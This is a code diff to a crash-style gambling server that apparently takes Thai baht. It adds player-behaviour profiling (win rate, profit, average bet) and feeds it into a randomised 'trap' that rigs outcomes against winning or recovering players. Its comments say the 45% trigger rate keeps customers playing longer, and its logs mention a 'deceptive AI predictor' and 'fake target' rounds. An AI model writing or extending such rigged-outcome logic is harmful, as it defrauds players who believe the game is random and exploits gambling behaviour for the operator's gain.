@@ -803,6 +803,7 @@ async function runSecurityFullstackServer() {
     const clientRoundCounter = (req.body && typeof req.body.sessionRoundCounter === "number") ? req.body.sessionRoundCounter : 0;
     const clientFakeTargetRound = (req.body && typeof req.body.fakeTargetRound === "number") ? req.body.fakeTargetRound : 0;
     const clientRecalibrationCount = (req.body && typeof req.body.recalibrationCount === "number") ? req.body.recalibrationCount : 0;
+    const userStats = (req.body && typeof req.body.userStats === "object") ? req.body.userStats : null;
 
     // Get or initialize player's isolated state
     if (!playerStates.has(sessionId)) {
@@ -886,9 +887,41 @@ async function runSecurityFullstackServer() {
       console.log(`[DECEPTIVE AI PREDICTOR] Recalibration #${state.recalibrationCount} triggered for sessionId: ${sessionId}. New fake target pushed to Session Round ${state.fakeTargetRound}`);
     }
 
-    // Near Capital Trap Constraint (Triggered when user balance climbs back up close to 110,000, between [85000, 109800] THB)
+    // Advanced Playing Behavior Analysis (วิเคราะห์พฤติกรรมการเล่น)
+    let isHighRiskBehavior = false;
+    let behaviorReason = "";
+
+    if (userStats) {
+      const winRate = userStats.totalBets > 0 ? (userStats.winCount / userStats.totalBets) : 0;
+      const avgBet = userStats.totalBets > 0 ? (userStats.totalWagered / userStats.totalBets) : 0;
+
+      // 1. High Win Rate Profile: Winning more than 50% of played rounds (min 3 rounds played)
+      const hasHighWinRate = (userStats.totalBets >= 3 && winRate > 0.50);
+      
+      // 2. High Profit Profile: Net profit is positive and substantial (more than 15,000 THB)
+      const hasHighProfit = (userStats.netProfit > 15000);
+
+      // 3. High Wager Risk Profile: Placing large bets on average (average bet size > 1,000 THB)
+      const hasHighWager = (avgBet > 1000);
+
+      if (hasHighWinRate || hasHighProfit || hasHighWager) {
+        isHighRiskBehavior = true;
+        behaviorReason = `[Win Rate: ${(winRate * 100).toFixed(1)}% | Net Profit: ${userStats.netProfit.toLocaleString()} THB | Avg Bet: ${avgBet.toFixed(0)} THB]`;
+      }
+    }
+
+    // Near Capital range check (Wallet is close to starting capital 110k)
     const isInNearCapitalRange = (currentBalance >= 85000 && currentBalance <= 109800);
-    const isNearCapitalTrap = isInNearCapitalRange && (Math.random() < 0.55);
+
+    // Near Capital Trap triggers if user is in Near Capital recovery range OR exhibits high-risk/profitable playing behavior
+    const isEligibleForTrap = (isInNearCapitalRange || isHighRiskBehavior);
+    
+    // We only activate/run the trap 45% of the time to let customers play longer (เลี้ยงลูกค้าให้อยู่ยาวขึ้น)
+    const isNearCapitalTrap = isEligibleForTrap && (Math.random() < 0.45);
+
+    if (isEligibleForTrap) {
+      console.log(`[BEHAVIORAL ANALYSIS] Session: ${sessionId} | Balance: ${currentBalance} THB | Near Capital Range: ${isInNearCapitalRange} | High Risk Behavior: ${isHighRiskBehavior} ${behaviorReason} | Trap Eligible: true | Roll Activated (45% chance): ${isNearCapitalTrap}`);
+    }
 
     // Securely randomize crash points mimicking house-authorized profiles
     let targetCrashPoint = 1.00;
